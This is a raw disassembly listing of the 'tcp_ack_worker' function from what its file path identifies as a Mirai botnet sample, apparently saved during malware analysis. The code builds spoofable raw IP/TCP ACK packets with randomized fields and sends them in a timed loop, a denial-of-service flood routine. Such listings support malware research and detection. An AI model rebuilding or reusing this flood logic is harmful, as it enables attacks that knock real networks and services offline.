
/Users/taogoldi/Projects/malware/Mirai/input/d40cf9c95dcedf4f19e4a5f5bb744c8e98af87eb5703c850e6fda3b613668c28.elf:	file format elf64-x86-64

Disassembly of section .text:

0000000000401b60 <tcp_ack_worker>:
  401b60: 4c 89 64 24 e0               	mov	qword ptr [rsp - 0x20], r12
  401b65: 48 89 5c 24 d0               	mov	qword ptr [rsp - 0x30], rbx
  401b6a: 48 89 6c 24 d8               	mov	qword ptr [rsp - 0x28], rbp
  401b6f: 4c 89 6c 24 e8               	mov	qword ptr [rsp - 0x18], r13
  401b74: 4c 89 74 24 f0               	mov	qword ptr [rsp - 0x10], r14
  401b79: 4c 89 7c 24 f8               	mov	qword ptr [rsp - 0x8], r15
  401b7e: 48 83 ec 68                  	sub	rsp, 0x68
  401b82: 4c 8b 2f                     	mov	r13, qword ptr [rdi]
  401b85: 31 ff                        	xor	edi, edi
  401b87: e8 44 5d 00 00               	call	0x4078d0 <time>
  401b8c: be 03 00 00 00               	mov	esi, 0x3
  401b91: bf 02 00 00 00               	mov	edi, 0x2
  401b96: 49 63 55 44                  	movsxd	rdx, dword ptr [r13 + 0x44]
  401b9a: 48 01 d0                     	add	rax, rdx
  401b9d: ba 06 00 00 00               	mov	edx, 0x6
  401ba2: 48 89 04 24                  	mov	qword ptr [rsp], rax
  401ba6: e8 c9 8c 00 00               	call	0x40a874 <socket>
  401bab: 85 c0                        	test	eax, eax
  401bad: 41 89 c4                     	mov	r12d, eax
  401bb0: 0f 88 b3 00 00 00            	js	0x401c69 <tcp_ack_worker+0x109>
  401bb6: 48 8d 4c 24 2c               	lea	rcx, [rsp + 0x2c]
  401bbb: 48 8d 5c 24 28               	lea	rbx, [rsp + 0x28]
  401bc0: 31 f6                        	xor	esi, esi
  401bc2: 41 b8 04 00 00 00            	mov	r8d, 0x4
  401bc8: ba 03 00 00 00               	mov	edx, 0x3
  401bcd: 89 c7                        	mov	edi, eax
  401bcf: c7 44 24 2c 01 00 00 00      	mov	dword ptr [rsp + 0x2c], 0x1
  401bd7: e8 60 8c 00 00               	call	0x40a83c <setsockopt>
  401bdc: 41 b8 04 00 00 00            	mov	r8d, 0x4
  401be2: 48 89 d9                     	mov	rcx, rbx
  401be5: ba 07 00 00 00               	mov	edx, 0x7
  401bea: be 01 00 00 00               	mov	esi, 0x1
  401bef: 44 89 e7                     	mov	edi, r12d
  401bf2: c7 44 24 28 00 00 80 00      	mov	dword ptr [rsp + 0x28], 0x800000
  401bfa: e8 3d 8c 00 00               	call	0x40a83c <setsockopt>
  401bff: 41 b8 04 00 00 00            	mov	r8d, 0x4
  401c05: 48 89 d9                     	mov	rcx, rbx
  401c08: ba 08 00 00 00               	mov	edx, 0x8
  401c0d: be 01 00 00 00               	mov	esi, 0x1
  401c12: 44 89 e7                     	mov	edi, r12d
  401c15: e8 22 8c 00 00               	call	0x40a83c <setsockopt>
  401c1a: 48 8d 54 24 10               	lea	rdx, [rsp + 0x10]
  401c1f: 4c 89 ee                     	mov	rsi, r13
  401c22: bf 02 00 00 00               	mov	edi, 0x2
  401c27: 48 c7 44 24 10 00 00 00 00   	mov	qword ptr [rsp + 0x10], 0x0
  401c30: 48 c7 44 24 18 00 00 00 00   	mov	qword ptr [rsp + 0x18], 0x0
  401c39: 48 83 c2 04                  	add	rdx, 0x4
  401c3d: 66 c7 44 24 10 02 00         	mov	word ptr [rsp + 0x10], 0x2
  401c44: e8 66 85 00 00               	call	0x40a1af <inet_pton>
  401c49: 49 63 45 48                  	movsxd	rax, dword ptr [r13 + 0x48]
  401c4d: 4c 8d 70 28                  	lea	r14, [rax + 0x28]
  401c51: 4c 89 f7                     	mov	rdi, r14
  401c54: e8 6f 8e 00 00               	call	0x40aac8 <malloc>
  401c59: 48 85 c0                     	test	rax, rax
  401c5c: 48 89 c5                     	mov	rbp, rax
  401c5f: 75 0f                        	jne	0x401c70 <tcp_ack_worker+0x110>
  401c61: 44 89 e7                     	mov	edi, r12d
  401c64: e8 d5 36 00 00               	call	0x40533e <close>
  401c69: 31 ff                        	xor	edi, edi
  401c6b: e8 3f 0e 00 00               	call	0x402aaf <pthread_exit>
  401c70: 4c 8d 78 14                  	lea	r15, [rax + 0x14]
  401c74: 48 8d 40 28                  	lea	rax, [rax + 0x28]
  401c78: 31 ff                        	xor	edi, edi
  401c7a: 48 89 44 24 08               	mov	qword ptr [rsp + 0x8], rax
  401c7f: e8 4c 5c 00 00               	call	0x4078d0 <time>
  401c84: 48 89 c3                     	mov	rbx, rax
  401c87: e8 95 37 00 00               	call	0x405421 <pthread_self>
  401c8c: 31 c3                        	xor	ebx, eax
  401c8e: 31 ff                        	xor	edi, edi
  401c90: e8 3b 5c 00 00               	call	0x4078d0 <time>
  401c95: 48 39 04 24                  	cmp	qword ptr [rsp], rax
  401c99: 0f 8e 45 01 00 00            	jle	0x401de4 <tcp_ack_worker+0x284>
  401c9f: 69 c3 6d 4e c6 41            	imul	eax, ebx, 0x41c64e6d
  401ca5: 8d 98 39 30 00 00            	lea	ebx, [rax + 0x3039]
  401cab: 41 8b 45 48                  	mov	eax, dword ptr [r13 + 0x48]
  401caf: 85 c0                        	test	eax, eax
  401cb1: 7e 1c                        	jle	0x401ccf <tcp_ack_worker+0x16f>
  401cb3: 48 89 ea                     	mov	rdx, rbp
  401cb6: 31 f6                        	xor	esi, esi
  401cb8: 89 f1                        	mov	ecx, esi
  401cba: 89 d8                        	mov	eax, ebx
  401cbc: ff c6                        	inc	esi
  401cbe: 83 e1 07                     	and	ecx, 0x7
  401cc1: d3 e8                        	shr	eax, cl
  401cc3: 88 42 28                     	mov	byte ptr [rdx + 0x28], al
  401cc6: 48 ff c2                     	inc	rdx
  401cc9: 41 39 75 48                  	cmp	dword ptr [r13 + 0x48], esi
  401ccd: 7f e9                        	jg	0x401cb8 <tcp_ack_worker+0x158>
  401ccf: 0f b6 45 00                  	movzx	eax, byte ptr [rbp]
  401cd3: c6 45 01 00                  	mov	byte ptr [rbp + 0x1], 0x0
  401cd7: 48 89 ef                     	mov	rdi, rbp
  401cda: c6 45 08 40                  	mov	byte ptr [rbp + 0x8], 0x40
  401cde: c6 45 09 06                  	mov	byte ptr [rbp + 0x9], 0x6
  401ce2: be 0a 00 00 00               	mov	esi, 0xa
  401ce7: 66 c7 45 06 00 00            	mov	word ptr [rbp + 0x6], 0x0
  401ced: 66 c7 45 0a 00 00            	mov	word ptr [rbp + 0xa], 0x0
  401cf3: 83 e0 f0                     	and	eax, -0x10
  401cf6: 83 c8 05                     	or	eax, 0x5
  401cf9: 83 e0 0f                     	and	eax, 0xf
  401cfc: 83 c8 40                     	or	eax, 0x40
  401cff: 88 45 00                     	mov	byte ptr [rbp], al
  401d02: 44 89 f0                     	mov	eax, r14d
  401d05: 66 c1 c8 08                  	ror	ax, 0x8
  401d09: 66 89 45 02                  	mov	word ptr [rbp + 0x2], ax
  401d0d: 89 d8                        	mov	eax, ebx
  401d0f: 66 c1 c8 08                  	ror	ax, 0x8
  401d13: 66 89 45 04                  	mov	word ptr [rbp + 0x4], ax
  401d17: 41 8b 45 4c                  	mov	eax, dword ptr [r13 + 0x4c]
  401d1b: 89 45 0c                     	mov	dword ptr [rbp + 0xc], eax
  401d1e: 8b 44 24 14                  	mov	eax, dword ptr [rsp + 0x14]
  401d22: 89 45 10                     	mov	dword ptr [rbp + 0x10], eax
  401d25: e8 46 f7 ff ff               	call	0x401470 <checksum>
  401d2a: ba 37 49 11 04               	mov	edx, 0x4114937
  401d2f: 66 89 45 0a                  	mov	word ptr [rbp + 0xa], ax
  401d33: 89 d8                        	mov	eax, ebx
  401d35: f7 e2                        	mul	edx
  401d37: 89 d8                        	mov	eax, ebx
  401d39: 4c 89 fe                     	mov	rsi, r15
  401d3c: 48 89 ef                     	mov	rdi, rbp
  401d3f: 66 41 c7 47 0e ff ff         	mov	word ptr [r15 + 0xe], 0xffff
  401d46: 66 41 c7 47 10 00 00         	mov	word ptr [r15 + 0x10], 0x0
  401d4d: 66 41 c7 47 12 00 00         	mov	word ptr [r15 + 0x12], 0x0
  401d54: 29 d0                        	sub	eax, edx
  401d56: d1 e8                        	shr	eax
  401d58: 01 c2                        	add	edx, eax
  401d5a: 89 d8                        	mov	eax, ebx
  401d5c: c1 ea 0f                     	shr	edx, 0xf
  401d5f: 69 d2 ff fb 00 00            	imul	edx, edx, 0xfbff
  401d65: 29 d0                        	sub	eax, edx
  401d67: 66 05 00 04                  	add	ax, 0x400
  401d6b: 66 c1 c8 08                  	ror	ax, 0x8
  401d6f: 66 41 89 07                  	mov	word ptr [r15], ax
  401d73: 41 8b 45 40                  	mov	eax, dword ptr [r13 + 0x40]
  401d77: 66 c1 c8 08                  	ror	ax, 0x8
  401d7b: 66 41 89 47 02               	mov	word ptr [r15 + 0x2], ax
  401d80: 89 d8                        	mov	eax, ebx
  401d82: 41 c7 47 04 00 00 00 00      	mov	dword ptr [r15 + 0x4], 0x0
  401d8a: 0f c8                        	bswap	eax
  401d8c: 41 89 47 08                  	mov	dword ptr [r15 + 0x8], eax
  401d90: 41 0f b6 47 0c               	movzx	eax, byte ptr [r15 + 0xc]
  401d95: 83 e0 0f                     	and	eax, 0xf
  401d98: 83 c8 50                     	or	eax, 0x50
  401d9b: 41 88 47 0c                  	mov	byte ptr [r15 + 0xc], al
  401d9f: 41 0f b6 47 0d               	movzx	eax, byte ptr [r15 + 0xd]
  401da4: 83 e0 fd                     	and	eax, -0x3
  401da7: 83 c8 10                     	or	eax, 0x10
  401daa: 41 88 47 0d                  	mov	byte ptr [r15 + 0xd], al
  401dae: 41 8b 4d 48                  	mov	ecx, dword ptr [r13 + 0x48]
  401db2: 48 8b 54 24 08               	mov	rdx, qword ptr [rsp + 0x8]
  401db7: e8 14 fb ff ff               	call	0x4018d0 <tcp_checksum>
  401dbc: 4c 8d 44 24 10               	lea	r8, [rsp + 0x10]
  401dc1: 66 41 89 47 10               	mov	word ptr [r15 + 0x10], ax
  401dc6: 41 b9 10 00 00 00            	mov	r9d, 0x10
  401dcc: b9 40 40 00 00               	mov	ecx, 0x4040
  401dd1: 4c 89 f2                     	mov	rdx, r14
  401dd4: 48 89 ee                     	mov	rsi, rbp
  401dd7: 44 89 e7                     	mov	edi, r12d
  401dda: e8 b9 2d 00 00               	call	0x404b98 <sendto>
  401ddf: e9 aa fe ff ff               	jmp	0x401c8e <tcp_ack_worker+0x12e>
  401de4: 48 89 ef                     	mov	rdi, rbp
  401de7: e8 6f 98 00 00               	call	0x40b65b <free>
  401dec: 66 66 66 90                  	nop
  401df0: e9 6c fe ff ff               	jmp	0x401c61 <tcp_ack_worker+0x101>
  401df5: 66 66 66 90                  	nop
  401df9: 66 66 66 90                  	nop
  401dfd: 66 66 90                     	nop
